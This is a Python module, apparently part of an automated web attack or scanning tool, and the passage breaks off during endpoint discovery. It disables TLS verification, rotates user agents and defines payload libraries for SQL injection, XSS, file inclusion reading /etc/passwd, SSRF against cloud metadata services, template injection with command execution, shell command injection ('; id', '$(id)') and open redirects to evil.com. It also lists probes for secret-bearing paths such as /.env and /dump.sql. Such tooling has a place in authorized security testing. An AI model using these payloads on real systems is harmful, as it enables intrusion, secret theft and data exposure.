# modules/web_vuln_scanner.py
# target: any HTTP/HTTPS web application

import re
import time
import random
import hashlib
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class VulnFinding:
    vuln_type: str
    severity: str          # critical / high / medium / low / info
    url: str
    parameter: Optional[str]
    payload: Optional[str]
    evidence: str
    confidence: str        # confirmed / likely / potential
    cwe: Optional[str] = None
    cvss: Optional[float] = None


@dataclass
class ScanState:
    """Shared mutable state passed between scan phases."""
    target_url: str
    domain: str
    discovered_endpoints: List[str] = field(default_factory=list)
    discovered_params: Dict[str, List[str]] = field(default_factory=dict)
    findings: List[VulnFinding] = field(default_factory=list)
    baseline_hashes: Dict[str, str] = field(default_factory=dict)
    lock: threading.Lock = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# Session factory
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=40)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.verify = False
    return session


_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]


def _random_ua() -> str:
    return random.choice(_UA_POOL)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _get(session: requests.Session, url: str, params: Optional[Dict] = None,
         timeout: float = 8.0, allow_redirects: bool = True) -> Optional[requests.Response]:
    try:
        headers = {"User-Agent": _random_ua()}
        return session.get(url, params=params, headers=headers,
                           timeout=timeout, allow_redirects=allow_redirects)
    except requests.RequestException:
        return None
        
        
def _post(session: requests.Session, url: str, data: Optional[Dict] = None,
          json_body: Optional[Dict] = None, timeout: float = 8.0) -> Optional[requests.Response]:
    try:
        headers = {"User-Agent": _random_ua(),
                   "Content-Type": "application/x-www-form-urlencoded"}
        return session.post(url, data=data, json=json_body,
                            headers=headers, timeout=timeout)
    except requests.RequestException:
        return None
        
        
def _body_hash(resp: requests.Response) -> str:
    return hashlib.md5(resp.content).hexdigest()


def _size_delta(a: requests.Response, b: requests.Response) -> int:
    return abs(len(a.content) - len(b.content))


# ---------------------------------------------------------------------------
# Baseline fingerprinting
# ---------------------------------------------------------------------------

def _build_baseline(session: requests.Session, state: ScanState) -> None:
    """
    Capture a stable baseline response for each known endpoint.
    Used by boolean-blind detectors to distinguish real differentials
    from dynamic content noise.
    """
    for ep in state.discovered_endpoints[:40]:
        resp = _get(session, ep)
        if resp:
            state.baseline_hashes[ep] = _body_hash(resp)


# ---------------------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, detection_hint)
    ("'", "syntax error|mysql|sqlite|pg|ora-|sql"),
    ("' OR '1'='1", "syntax error|mysql|sqlite"),
    ("' OR 1=1--", "syntax error"),
    ("1 AND 1=2 UNION SELECT NULL--", "union|column"),
    ("' AND SLEEP(4)--", "__time_based__"),
    ("'; WAITFOR DELAY '0:0:4'--", "__time_based__"),
    ("' AND (SELECT 1 FROM (SELECT(SLEEP(4)))a)--", "__time_based__"),
    ("1' ORDER BY 1--", "syntax error|unknown column"),
    ("1' ORDER BY 99--", "syntax error|unknown column"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--", "xpath|extractvalue"),
    ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
     "conversion failed"),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "union|null"),
    ("\" OR \"\"=\"", "syntax error"),
    ("`OR 1=1#", "syntax error|mysql"),
]

_XSS_PAYLOADS: List[Tuple[str, str]] = [
    ("<script>alert(1)</script>", r"<script>alert\(1\)</script>"),
    ("<img src=x onerror=alert(1)>", r"onerror=alert"),
    ("\"><script>alert(1)</script>", r"<script>alert"),
    ("'><svg/onload=alert(1)>", r"onload=alert"),
    ("<details open ontoggle=alert(1)>", r"ontoggle=alert"),
    ("javascript:alert(1)", r"javascript:alert"),
    ("<iframe src=javascript:alert(1)>", r"src=javascript"),
    ("<body onload=alert(1)>", r"onload=alert"),
    ("{{7*7}}", r"49"),                   # SSTI bleed-over check
    ("<script>alert`1`</script>", r"alert`1`"),
]

_LFI_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../etc/passwd", "root:x:0"),
    ("....//....//....//etc/passwd", "root:x:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0"),
    ("..%252f..%252f..%252fetc%252fpasswd", "root:x:0"),
    ("../../../windows/win.ini", r"\[extensions\]"),
    ("../../../boot.ini", r"\[boot loader\]"),
    ("php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}="),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "PHP Version"),
]

_SSRF_TARGETS: List[str] = [
    "http://169.254.169.254/latest/meta-data/",           # AWS IMDS v1
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",                # DigitalOcean
    "http://169.254.169.254/metadata/instance",           # Azure
    "http://100.100.100.200/latest/meta-data/",           # Alibaba Cloud
    "http://127.0.0.1/server-status",                     # Apache mod_status
    "http://127.0.0.1:6379/",                             # Redis
    "http://127.0.0.1:9200/_nodes",                       # Elasticsearch
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localhost/",
]

_SSTI_PAYLOADS: List[Tuple[str, str]] = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),            # Jinja2 vs Twig divergence
    ("{{config}}", "SECRET_KEY|DEBUG"),  # Flask/Jinja2 config leak
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),   # Spring SPEL
    ("{{''.class.mro()[1].subclasses()}}", "subprocess"),
]

_CMD_INJECT_PAYLOADS: List[Tuple[str, str]] = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; sleep 4 #", "__time_based__"),
    ("| sleep 4", "__time_based__"),
    ("\n/bin/sh -c id", r"uid=\d+"),
    ("; ping -c 1 127.0.0.1 #", r"bytes from"),
    ("& whoami", r"root|www-data|apache|nginx"),
]

_OPEN_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "/%09/evil.com",
    "//%09evil.com",
]

_REDIRECT_PARAMS = [
    "next", "url", "redirect", "redirect_to", "redirect_url",
    "return", "return_url", "returnurl", "returnto", "goto",
    "destination", "dest", "redir", "forward", "location",
    "target", "link", "go", "continue", "back",
]

_SSRF_PARAMS = [
    "url", "uri", "src", "source", "img", "image", "file", "path",
    "fetch", "load", "href", "link", "resource", "endpoint",
    "callback", "webhook", "proxy", "ping", "target", "host",
    "to", "from", "destination", "addr", "request",
]

_PATH_TRAVERSAL_SINK_PARAMS = [
    "file", "path", "page", "template", "doc", "document",
    "view", "name", "filename", "folder", "dir", "directory",
    "load", "read", "include", "require", "resource",
]

# ---------------------------------------------------------------------------
# Phase 1 — Endpoint & parameter discovery
# ---------------------------------------------------------------------------

_COMMON_PATHS = [
    "/", "/login", "/admin", "/api", "/api/v1", "/api/v2",
    "/graphql", "/search", "/index.php", "/wp-admin",
    "/xmlrpc.php", "/phpmyadmin", "/.git/HEAD", "/.env",
    "/robots.txt", "/sitemap.xml", "/config.php",
    "/backup", "/backup.zip", "/dump.sql",
    "/.htaccess", "/server-status", "/actuator",
    "/actuator/env", "/actuator/heapdump",
    "/api/swagger.json", "/swagger-ui/index.html",
    "/v1/docs", "/openapi.json",
]

_PARAM_DISCOVERY_WORDLIST = [
    "id", "user", "username", "email", "name", "search", "q",
    "query", "page", "file", "path", "url", "redirect", "next",
    "token", "key", "api_key", "action", "type", "format",
    "order", "sort", "limit", "offset", "filter", "category",
    "lang", "locale", "debug", "test", "admin", "mode",
    "callback", "jsonp", "data", "payload", "input", "output",
    "src", "dest", "from", "to", "target", "host", "port",
]


def _discover_endpoints(session: requests.Session, state: ScanState) -> None:
    """
    Crawl the target at shallow depth and supplement with common-path probing.
    Endpoints found here feed every downstream scan phase.
    """
    found: List[str] = []
    base = state.target_url.rstrip("/")
    base_domain = state.domain

    # Probe known paths in parallel
    def _probe(path: str) -> Optional[str]:
        url = base + path
        resp = _get(session, url, allow_redirects=False)
        if resp and resp.status_code not in (404, 410, 400):
            return url
        return None
        
    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = {ex.submit(_probe, p): p for p in _COMMON_PATHS}